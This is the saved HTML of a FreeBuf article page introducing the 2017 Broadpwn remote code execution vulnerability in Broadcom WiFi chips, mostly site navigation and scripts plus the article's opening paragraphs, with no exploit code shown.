<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!--
                              _.._        ,------------.
                           ,'      `.    ( We want you! )
                          /  __) __` \    `-,----------'
                         (  (`-`(-')  ) _.-'
                         /)  \  = /  (
                        /'    |--' .  \
                       (  ,---|  `-.)__`
                        )(  `-.,--'   _`-.
                       '/,'          (  Uu",
                        (_       ,    `/,-' )
                        `.__,  : `-'/  /`--'
                          |     `--'  |
                          `   `-._   /
                           \        (
                           /\ .      \.  freebuf
                          / |` \     ,-\
                         /  \| .)   /   \
                        ( ,'|\    ,'     :
                        | \,`.`--"/      }
                        `,'    \  |,'    /
                       / "-._   `-/      |
                       "-.   "-.,'|     ;
                      /        _/["---'""]
                     :        /  |"-     '
                     '           |      /
                                 `      |
-->
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>
  第一只WiFi蠕虫的诞生：完整解析博通WiFi芯片Broadpwn漏洞（含EXP／POC） - FreeBuf.COM | 关注黑客与极客</title>
<meta name="description" content="过去的几个月里，Android 和 iOS 数十亿台设备中都曾出现过可怕的 WiFi&nbsp;远程代码执行漏洞 BroadPwn。谷歌 7 月初发布了修复补丁，而苹果则是在 7 月 19 日发布的更新。而此次开得热火朝天的 Black Hat 2017上…" />
<meta name="keywords" content="Broadpwn, WiFi蠕虫, 博通, 无线安全解决方案,无线安全知识大全,无线安全技术, 最新漏洞报告,漏洞众测平台,漏洞攻击分析,漏洞POC和EXP, 特别企划" />
<meta name="baidu-site-verification" content="nKKKqQxp6R" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="renderer" content="webkit">
<meta property="qc:admins" content="6620477777662552566375" />
<link rel='stylesheet' id='wpfp-css' href='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.css' type='text/css' />
<link rel='stylesheet' id='wp-recentcomments-css'  href='http://static.3001.net/css/recentcomments/wp-recentcomments.css?ver=2.2.3' type='text/css' media='screen' />
<link rel='stylesheet' id='mycred-widget-css'  href='http://www.freebuf.com/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1' type='text/css' media='all' />
<script type='text/javascript' src='http://static.3001.net/js/header/jquery.min.js?ver=3.6.1'></script>
<script type='text/javascript' src='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1'></script>
<link rel='prev' title='福特、宝马、英菲尼迪和日产汽车TCU存在漏洞，可被远程入侵' href='http://www.freebuf.com/news/143040.html' />
<link rel='next' title='安天发现新型DDoS攻击木马“魔鼬”' href='http://www.freebuf.com/news/142927.html' />
<link rel='canonical' href='http://www.freebuf.com/vuls/142099.html' />
<link rel='shortlink' href='http://www.freebuf.com/?p=142099' />

<link rel="stylesheet" href="http://static.3001.net/css/highslide/highslide.css" type="text/css" />
<script type="text/javascript" src="http://static.3001.net/js/highslide/highslide-with-html.packed.js"></script>
<script type="text/javascript">
jQuery(document).ready(function($) {
    hs.graphicsDir = "http://www.freebuf.com/buf/plugins/auto-highslide/images/graphics/";
    hs.outlineType = "rounded-white";
    hs.dimmingOpacity = 0.8;
    hs.outlineWhileAnimating = true;
    hs.showCredits = false;
    hs.captionEval = "this.thumb.alt";
    hs.numberPosition = "caption";
    hs.align = "center";
    hs.transitions = ["expand", "crossfade"];
    hs.addSlideshow({
        interval: 5000,
        repeat: true,
        useControls: true,
        fixedControls: "fit",
        overlayOptions: {
            opacity: 0.75,
            position: "bottom center",
            hideOnMouseOut: true

        }

    });
});
</script>
          <script language="JavaScript" type="text/javascript" src="http://www.freebuf.com/buf/plugins/cartpauj-pm/js/script.js"></script>
      <link rel="stylesheet" type="text/css" href="http://www.freebuf.com/buf/plugins/cartpauj-pm/style/style.css" />
      <script type="text/javascript" src="http://www.freebuf.com/buf/plugins/simditor/highlight/highlight.pack.js"></script><link type="text/css" rel="stylesheet" href=" http://www.freebuf.com/buf/plugins/simditor/highlight/styles/default.css" />	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
<link rel="shortcut icon" href="http://static.freebuf.com/images/favicon.ico" />
<link rel="stylesheet" href="http://static.3001.net/css/new/header.css" />
<link href="http://static.3001.net/css/new/bootstrap.min.css?ver=2016051701" rel="stylesheet" media="screen">
    <!--轮播图-->
    <link href="http://static.3001.net/css/new/swiper-3.4.2.min.css" rel="stylesheet" type="text/css">
    <link href="http://static.3001.net/css/new/style.css?ver=20170912568" rel="stylesheet" type="text/css">
    <style type="text/css">
#contenttxt hr {
  display: block;
  height: 0px;
  border: 0;
  border-top: 1px solid #ccc;
  margin: 15px 0;
  padding: 0;
}
#contenttxt table {
  width: 100%;
  table-layout: fixed;
  border-collapse: collapse;
  border-spacing: 0;
  margin: 15px 0;
}
#contenttxt table thead {
  background-color: #f9f9f9;
}
#contenttxt table td, #contenttxt table th {
  min-width: 40px;
  height: 30px;
  border: 1px solid #ccc;
  vertical-align: top;
  padding: 2px 4px;
  text-align: left;
  box-sizing: border-box;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
#contenttxt table td.active, #contenttxt table th.active {
  background-color: #ffffee;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
</style>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/bootstrap.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
<script src="http://static.3001.net/js/focus/bjqs-1.3.min.js" type="text/javascript" ></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript" ></script>
<script type="text/javascript" src="http://static.3001.net/js/new/setint.js"></script>
    <!--轮播图-->
    <script src="http://static.3001.net/js/colum/swiper-3.4.2.min.js"></script>
<!--[if lt IE 9]>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/html5shiv.min.js"></script>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/respond.min.js"></script>
<![endif]-->
    <style>
        @font-face {font-family: 'iconfont';
            src: url('http://static.3001.net/iconfont/iconfont.eot'); /* IE9*/
            src: url('http://static.3001.net/iconfont/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
            url('http://static.3001.net/iconfont/iconfont.woff') format('woff'), /* chrome、firefox */
            url('http://static.3001.net/iconfont/iconfonticonfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
            url('http://static.3001.net/iconfont/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
        }
    </style>
</head>

<body>
<!----------header---------->
<!--头部导航-->
<div id="undefined-sticky-wrapper" class="sticky-wrapper is-sticky">
    <div class="main-header">
        <div class="header">
            <div class="header-container clearfix">
                                <div class="header-logo"><a href="http://www.freebuf.com"></a></div>
                                        <!-- column -->
                        <div class="nav">
                            <ul class="nav-child clearfix">
                                <li class=" index">
                                    <a href="http://www.freebuf.com">首页</a></li>
                                <li data-value="read-menu">
                                    <a href="#">分类阅读<b class="triangle-down triangle-down-04"></b></a>
                                </li>
                                <li data-value="wenku-menu"><a href="javascript:;" target="_blank">文库<b class="triangle-down triangle-down-04"></b></a></li>
                                <li>
                                    <a href="http://zhuanlan.freebuf.com" target="_blank">专栏</a><b class="icon-betr"></b>
                                </li>
                                <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                                <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                                <li data-value="company-menu"><a href="javascript:;" >企业服务<b class="triangle-down triangle-down-04"></b></a></li>
                                <li data-value="user-menu"><a href="javascript:;" >用户服务<b class="triangle-down triangle-down-04"></b></a></li>
                            </ul>
                        </div>
                                        <div class="header-right">
                                    <div class="loginSign login-before">
                        <a href="https://account.tophant.com/register.html" class="login-btn">注册</a>
                        |
                        <a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a>
                    </div>
                                    <!--搜索-->
                    <div class="search-form-inner clearfix">
                        <i class="searchdisplayico"></i>
                        <div class="form-group has-active search-col search-form-text">
                            <form id="hpsform-new" class="navbar-search navbar-form" onsubmit="return dispatch();">
                                <div class="form-group">
                                    <input id="bigq" class="input form-control" type="text" placeholder="关键字查找" autocomplete="off" title="关键字查找" name="q">
                                    <button class="submit" type="submit"></button>
                                </div>
                            </form>
                        </div>
                    </div>
                    <!--<script>
                        $('.search-form-inner .searchdisplayico').click(function(event) {
                            var evt = evt || event;
                            evt.stopPropagation();
                            $(this).siblings('.search-col').addClass('active');
                        });
                        $('.search-form-inner .search-col').click(function(event) {
                            var evt = evt || event;
                            evt.stopPropagation();
                            $('.search-form-inner .search-col').addClass('active');
                        });
                        $(document).click(function() {
                            $('.search-form-inner .search-col').removeClass('active');
                        });
                    </script>-->
                                    <div class="btn-publish">
                        <a href="#">投稿</a>
                        <div class="btn-publish-child">
                            <ul class="btn-child clearfix">
                                <li><a href="http://my.freebuf.com/post/edit/" target="_blank">文章撰写</a></li>
                                <li><hr/></li>
                                <li><a href="http://my.freebuf.com/post/article/" target="_blank">投稿管理</a></li>
                                                        </ul>
                        </div>
                    </div>
                </div>
                <div class="nav-small">
                    <a href="#">&#xe634;</a>
                    <ul class="nav-child clearfix">
                                                        <li class=" index">
                                    <a href="http://www.freebuf.com">首页</a></li>
                                <li class="read-classify">
                                    <a href="#">分类阅读<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2 read-classify clearfix">
                                        <li>
                                            <strong>黑客</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                                <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                                <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                                <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                                <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                                <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                                <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                                <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                                <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                                <a href="http://www.freebuf.com/articles/es" target="_blank">企业安全</a>
                                                <a href="http://www.freebuf.com/ics-articles" target="_blank">工控安全</a>
                                            </div>
                                        </li>
                                        <li>
                                            <strong>极客</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                                <a href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                                            </div>
                                        </li>
                                        <li>
                                            <strong>特色</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/news/special" target="_blank">头条</a>
                                                <a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a>
                                                <a href="http://www.freebuf.com/fevents" target="_blank">活动</a>
                                                <a href="http://www.freebuf.com/video" target="_blank">视频</a>
                                                <a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a>
                                                <a href="http://www.freebuf.com/jobs" target="_blank">招聘</a>
                                                <a href="http://www.freebuf.com/paper/" target="_blank">报告</a>
                                            </div>
                                        </li>
                                    </ul>
                                </li>
                                <li><a href="http://zhuanlan.freebuf.com/" target="_blank">专栏</a></li>
                                <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                                <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                                <li>
                                    <a href="javascript:;" target="_blank">企业服务<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="https://www.vulbox.com/bounties/item-9-0-1" target="_blank"><strong>企业SRC</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://company.freebuf.com" target="_blank"><strong>企业空间</strong></a>
                                        </li>
                                        <li>
                                            <a href="https://www.vulbox.com/" target="_blank"><strong>安全测试</strong></a>
                                        </li>
                                        <li>
                                            <a href="https://www.riskivy.com/" target="_blank"><strong>风险感知</strong></a>
                                        </li>

                                    </ul>
                                </li>
                                <li>
                                    <a href="javascript:;" target="_blank">用户服务<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="http://www.freebuf.com/newsend" target="_blank"><strong>有奖投稿</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://zhuanlan.freebuf.com" target="_blank">
                                        </li>
                                        <li>
                                            <a href="https://www.vulbox.com/bounties/detail-72" target="_blank"><strong>提交漏洞</strong></a>
                                        </li>
                                        <li class="last">
                                            <a href="https://www.vulbox.com/bounties" target="_blank"><strong>参与众测</strong></a>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <a href="javascript:;" target="_blank">文库<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="http://www.freebuf.com/wenku" target="_blank"><strong>文库</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://www.freebuf.com/special-subject" target="_blank"><strong>专题</strong></a>
                                        </li>
                                    </ul>
                                </li>
                                                    <li><a href="http://my.freebuf.com/post/edit" target="_blank">投稿</a></li>
                                                    <li><a href="https://account.tophant.com/register.html" class="login-btn">注册</a>
                            </li>
                            <li><a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a></li>
                                            </ul>
                </div>
            </div>
            <div class="dropdown-menu read-menu" id="read-menu">
                <div class="container">
                    <ul class="menu clearfix">
                        <li>
                            <strong>黑客</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                <a href="http://www.freebuf.com/articles/es" target="_blank">企业安全</a>
                                <a class="last" href="http://www.freebuf.com/ics-articles" target="_blank">工控安全</a>
                            </div>
                        </li>
                        <li>
                            <strong>极客</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                <a class="last" href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                            </div>
                        </li>
                        <li>
                            <strong>特色</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/news/special" target="_blank">头条</a>
                                <a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a>
                                <a href="http://www.freebuf.com/fevents" target="_blank">活动</a>
                                <a href="http://www.freebuf.com/video" target="_blank">视频</a>
                                <a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a>
                                <a href="http://www.freebuf.com/jobs" target="_blank">招聘</a>
                                <a class="last" href="http://www.freebuf.com/paper/" target="_blank">报告</a>
                            </div>
                        </li>
                    </ul>
                </div>
            </div>
            <div class="dropdown-menu company-menu" id="company-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="https://www.vulbox.com/bounties/item-9-0-1" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-src.png"></span>
                                <span class="name">企业SRC</span>
                                <span class="intro">全/半托管式互联网漏洞收集管理</span>
                            </a>
                        </li>
                        <li>
                            <a href="http://company.freebuf.com" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-company.png"></span>
                                <span class="name">企业空间</span>
                                <span class="intro">为企业定制信息安全专属门户</span>
                            </a>
                        </li>
                        <li>
                            <a href="https://www.vulbox.com/" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-safety.png"></span>
                                <span class="name">安全测试</span>
                                <span class="intro">国内领先的互联网安全众测服务</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="https://www.riskivy.com/" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-risk.png"></span>
                                <span class="name">风险感知</span>
                                <span class="intro">基于IT资产的自动化安全监控</span>
                            </a>
                        </li>

                    </ul>
                </div>
            </div>
            <div class="dropdown-menu user-menu" id="user-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="http://www.freebuf.com/newsend" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-write.png"></span>
                                <span class="name">有奖投稿</span>
                                <span class="intro">与整个行业分享你的经验与见解</span>
                            </a>
                        </li>
                        <li>
                            <a href="http://zhuanlan.freebuf.com" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-column.png"></span>
                                <span class="name">申请专栏</span>
                                <span class="intro">自由创作，打造自主内容品牌</span>
                            </a>
                        </li>
                        <li>
                            <a href="https://www.vulbox.com/bounties/detail-72" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-leak.png"></span>
                                <span class="name">提交漏洞</span>
                                <span class="intro">与数万白帽一起，让互联网更安全</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="https://www.vulbox.com/bounties" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-test.png"></span>
                                <span class="name">参与众测</span>
                                <span class="intro">挖洞开启自由职业之路</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
            <div class="dropdown-menu wenku-menu" id="wenku-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="http://www.freebuf.com/wenku" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-write.png"></span>
                                <span class="name">文库</span>
                                <span class="intro">最全的FB百科</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="http://www.freebuf.com/special-subject" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-test.png"></span>
                                <span class="name">专题</span>
                                <span class="intro">浓缩的安全精华汇总</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</div>
<!----------header end---------->
<!--<script type="application/javascript">
    var  _value_tab = '';
    $(function(){
        var _that = '', _show_flag = 0;
        $('.header .header-container .nav .nav-child > li:not(input[data-value])').mouseover(function() {
            $('.header .dropdown-menu').stop().slideUp(50);
        });
        $('.header').mouseout(function() {
            $('.header .dropdown-menu').stop().slideUp(50);
        });
        /*$('.header .header-container .nav .nav-child > li').mouseover(function() {
         _value_tab = $(this).attr('data-value');
         $('#'+_value_tab).siblings('.dropdown-menu').stop().slideUp(50);
         $('#'+_value_tab).stop().slideDown(100);
         });*/
        $(".header .header-container .nav .nav-child > li").hoverDelay({
            hoverDuring: 500,
            hoverEvent: function(){
                $('#'+_value_tab).siblings('.dropdown-menu').stop().slideUp(50);
                $('#'+_value_tab).stop().slideDown(100);
            }
        });
        $('.header .dropdown-menu').mouseover(function() {
            _value_tab = $(this).attr('id');
            _that = this;
            $('.nav-child li[data-value="'+_value_tab+'"]').addClass('hover');
            $(this).stop().slideDown(50);
        }).mouseout(function() {
            $('.nav-child li[data-value="'+_value_tab+'"]').removeClass('hover');
            $(_that).stop().slideUp(50);
        });

        $(".nav-small .nav-child > li").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();

            if($(this).find('.nav-child2').is(":hidden")) {
                _show_flag = 1;
                $(this).find('.nav-child2').slideDown();
                $(this).find('.icon-arrow').addClass('bottom');
            }else {
                _show_flag = 0;
                $(this).find('.nav-child2').slideUp();
                $(this).find('.icon-arrow').removeClass('bottom');
            }
            $(this).siblings().find('.nav-child2').slideUp();
            $(this).siblings().find('.icon-arrow').removeClass('bottom');
        });
        //头部投稿按钮hover状态展开菜单
        $(".btn-publish-child > ul > li").hover(function(){
            $(this).addClass("active");
            $(this).siblings().removeClass("active");
        });

        $(document).click(function(event){
            var ev = ev || event;
            $(".login-after").find(".login-after-child").hide();
        });
        //点击用户信息，出现下拉菜单
        $("#user-info").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();
            $(".login-after").find(".login-after-child").toggle();
        });
        //顶部导航
        $(".nav-small").click(function(){
            $(this).find(".nav-child").slideToggle();
        });
        var that = '';
        $('.header .header-container .nav .nav-child > li').mouseover(function() {
            that = this;
            $(this).find('.dropdown-menu').stop().slideDown(200);
        }).mouseout(function() {
            $(that).find('.dropdown-menu').stop().slideUp(200);
        });
    });
    $(".nav-small .nav-child > li").click(function(event){
        var ev = ev || event;
        ev.stopPropagation();
        $(this).siblings('li').find('.dropdown-menu').hide();
        $(this).find(".dropdown-menu").toggle();
    });
    //鼠标经过(hover)事件的延时处理
    (function($){
        $.fn.hoverDelay = function(options){
            var defaults = {
                hoverDuring: 100,
                outDuring: 100,
                hoverEvent: function(){
                    $.noop();
                },
                outEvent: function(){
                    $.noop();
                }
            };
            var sets = $.extend(defaults,options || {});
            var hoverTimer, outTimer;
            return $(this).each(function(){
                $(this).hover(function(){
                    _value_tab = $(this).attr('data-value');
                    clearTimeout(outTimer);
                    hoverTimer = setTimeout(sets.hoverEvent, sets.hoverDuring);
                },function(){
                    clearTimeout(hoverTimer);
                    outTimer = setTimeout(sets.outEvent, sets.outDuring);
                });
            });
        }
    })(jQuery);
</script>-->
<script type="text/javascript" src="http://static.3001.net/js/header/header.js"></script><script>
    jQuery(window).load(function(){
      if(jQuery(window).width()>480){
        jQuery(".main-header").sticky({ topSpacing: 0 });
      }else{
        jQuery(".main-header nav").removeClass("navbar-fixed-top");
      }
      jQuery("#mar-right").sticky({ topSpacing: 105,bottomSpacing: 410 });
    });
</script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/layer.js"></script>
<script type="text/javascript" src="http://static.3001.net/js/pretty/prettify.js"></script>
<script type="text/javascript" src="http://static.3001.net/js/header/lazyload.js"></script>
<script type="text/javascript" charset="utf-8">
      jQuery(function() {
          jQuery("img").lazyload({
              effect : "fadeIn"
          });
      });
 </script>
<script type="text/javascript">
    window.onload = function(){
        prettyPrint();
    }
</script>
<script language="JavaScript" type="text/javascript">
//<![CDATA[
var va = "您已经点亮过了";
function acv_vote(id,option, m){
  if( m==null) m =''; m = m + '';
  jQuery('#acv_stat_'+m+id).html('Loading...');
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option="+option+"&ID="+id;
  jQuery.get(url,function(d){
    d =d.split('|');var s='#acv_stat_'+m+d[0];
    var sele = '#cos_support-'+m+id,unsele = '#cos_unsupport-'+m+id,tpjs = 'javascript:alert(va)';
    jQuery( s ).html( d[1] );jQuery(s).fadeOut(400,function(){jQuery(s).fadeIn();});
    if( d[2] == 1 ){ jQuery(sele).html(jQuery(sele).html()*1+1); }
    if( d[2] == -1 ){ jQuery(unsele).html(jQuery(unsele).html()*1+1); }
    jQuery('#vote4-'+id).attr('href',tpjs);jQuery('#vote4-2'+id).attr('href',tpjs);
    jQuery('#votea-'+id).attr('href',tpjs);jQuery('#votea-2'+id).attr('href',tpjs);
  });
}
  
$(document).on("mouseenter",".comment-tools",function(){
  $(this).find(".btn-report").show();
  $(this).find(".btn-report").addClass("hover");
}).on("mouseleave",".comment-tools",function(){
  var $_this = $(this);
  $(this).find(".btn-report").removeClass("hover");
  if(!$(this).find(".dropup").hasClass('open')){
    $(this).find(".btn-report").hide(); 
    $_this.find(".dropdown-menu").css("display","none");
  }else{
    setTimeout(function(){
      if(!$_this.find(".btn-report").hasClass("hover")){
        $_this.find(".dropup").removeClass("open");
        $_this.find(".dropdown-menu").css("display","none");
        $_this.find(".btn-report").hide(); 
      }
    },"500");
  }
})

$(document).on("click",".click_report",function(){
  $(this).parent().parent().css("display","none");
  var id = $(this).attr("data-id");
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option=0&ID="+id;
  $_this = $(this);
  jQuery.get(url,function(d){
    d =d.split('|');
    if(d[1]=='您已经点过灯了'){
      d[1] = '您已经举报过了';
    }
    if(d[1]=='Thank you'){
      d[1] = '举报成功';
    }
    $_this.parent().parent().parent().find(".btn-report").text(d[1]);
    $_this.parent().parent().parent().find(".btn-report").css("display","block");
  })
})

$(document).on("click",".btn-report",function(){
  if($(this).parent().hasClass('open')){
    $(this).parent().find(".dropdown-menu").css("display","block");
  }else{
    $(this).parent().find(".dropdown-menu").css("display","none");
  }
})
//]]>
</script>
<div class="column-article" data-column="">
            <div class="container pad-top35">
        <div class="row clearfix">
            <div class="col-md-9" id="getWidth">
                                    <div class="reletive search-xs-wrap">
                    <div class="form-group has-active search-col search-xs">
                        <form id="hpsform-new" class="navbar-search navbar-form" onsubmit="return dispatch()">
                            <div class="form-group">
                                <input id="q" class="input form-control" type="text" placeholder="关键字查找" autocomplete="off" title="关键字查找" name="q">
                                <button class="submit" type="submit"></button>
                            </div>
                        </form>
                    </div>
                </div>
                    <script type="text/javascript">
                        var dispatch = function () {
                            console.log(123)
                            var q = document.getElementById("q");
                            if (q.value == "") {
                                q = document.getElementById("bigq");
                            }
                            if (q.value != "") {
                                window.open('http://www.freebuf.com/?s=' + q.value, "_blank");
                                return false;
                            } else {
                                return false;
                            }
                        }
                    </script>
                                <div class="article-wrap panel panel-default">
                                                            <div class="articlecontent">
                                                    <div class="title">
                                <h2>
                                    第一只WiFi蠕虫的诞生：完整解析博通WiFi芯片Broadpwn漏洞（含EXP／POC）                                </h2>
                                <div class="property">
                                                                            <span class="name"><a href="http://www.freebuf.com/author/Elaine_z" title="由 Elaine_z 发布" rel="author">Elaine_z</a></span>
                                                                        <span class="icon-f"><a href="http://zhuanlan.freebuf.com" target="_blank"><img src="http://image.3001.net/images/index/column-iden.png" title="专栏作者"></a></span>
                                    <span class="time">2017-08-04</span>
                                                                                                            <span class="look">共<strong>260684</strong>人围观
                                        ，发现 <strong>5</strong> 个不明物体 </span>                                      </span>
                                                                <span class="tags">
                                      <a href="http://www.freebuf.com/./articles/wireless">无线安全</a><a href="http://www.freebuf.com/./vuls">漏洞</a></span>
                                    <span class="tags_01"></span>
                                </div>
                            </div>
                                                                                                <div id="contenttxt">
                            <blockquote><p>过去的几个月里，Android 和 iOS 数十亿台设备中都曾出现过可怕的 WiFi&nbsp;远程代码执行漏洞 BroadPwn。谷歌 7 月初发布了修复补丁，而苹果则是在 7 月 19 日发布的更新。而此次开得热火朝天的 <a href="https://www.blackhat.com/us-17/briefings.html#broadpwn-remotely-compromising-android-and-ios-via-a-bug-in-broadcoms-wi-fi-chipsets" target="_blank" rel="nofollow">Black Hat 2017</a>上安全研究员 Nitay Artenstein 也针对这个漏洞进行了详细剖析。</p>
<p> <a href="http://www.freebuf.com/news/139773.html" target="_blank" rel="nofollow">Broadpwn</a>&nbsp;漏洞甚至还能进化成 WiFi 蠕虫，如果你的移动设备没有及时更新，只需置身在恶意WiFi范围内就会被黑客捕获、入侵、甚至被转化成恶意AP、继续感染附近的手机终端…</p>
<p>目前漏洞虽然已经得到修复——但这个漏洞的研究过程也许能给安全研究和防护带来深层次的思考。所以，本文按照黑帽大会上进行的分享及分享者的博客内容进行了整理，希望能给大家带来帮助！</p>
</blockquote>
<p><b style="color: rgb(0, 176, 80);">不需要用户交互、完全远程利用的漏洞，已经消失匿迹了一段时间了。这种漏洞在一些不够安全、或者说未能及时更新的设备上找到，（如路由器、IoT设备或者旧版 Windows 上），但在 Android 及 iOS 上，实际并没有可以远程利用并绕过 DEP 及 ASLR 保护机制的漏洞。如果想要侵入 Android 或 iOS设备，攻击者一般还是通过浏览器漏洞进行。从这个角度切入的话，我们可以从攻击者的视角进行思考，也就是说，有效的漏洞利用需要用户主动点击可疑链接、连接到攻击者的网络、或者浏览不受 HTTPS 保护的站点。然而，警觉性高的用户就不会上当。</b>&nbsp;</p>
<p>随着现代的操作系统不断加强安全防护，攻击者很难找到全新而有力的攻击向量。当然，远程漏洞利用绝非易事。常见的本地漏洞利用都会利用各种特定系统上的接口（如本地的系统调用或者Javascript&nbsp;），通过各种交互操作触发，这样攻击者可以获取涉及目标的地址空间以及内存状态的信息。而远程攻击者，在与目标的交互手段上会有很大的限制。为了成功实施一次远程攻击，攻击者所使用的漏洞需要在各种情况下都具有普适性。</p>
<p>本研究的目标在于揭示这种类型的攻击以及漏洞利用—— Broadpwn 是一种完全远程的攻击，它通过博通 BCM43xx 系列 WiFi 芯片组的漏洞在 Android 或 iOS 的主应用程序处理器上进行代码注入。<b>本文的叙述将会如下流程展开：首先是按照思考流程解释我们如何选择适合远程利用的攻击面，接着解释为了避免需要用户交互的触发，我们如何在特定程序块中进行调查、最后是如何形成一个可用且完全远程的漏洞利用。</b></p>
<p style="text-align: center;"><b><b style="color: rgb(0, 176, 80);"><img alt="第一只WiFi蠕虫的诞生：完整解析博通WiFi芯片 Broadpwn 漏洞（含EXP／POC）" data-original="http://image.3001.net/images/20170727/15011478769317.jpg!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="371.3454545454546"></b><br /></b></p>
<noscript><img alt="第一只WiFi蠕虫的诞生：完整解析博通WiFi芯片 Broadpwn 漏洞（含EXP／POC）" src="http://image.3001.net/images/20170727/15011478769317.jpg!small" width="690" height="371.3454545454546"></b><br /></b></p></noscript>
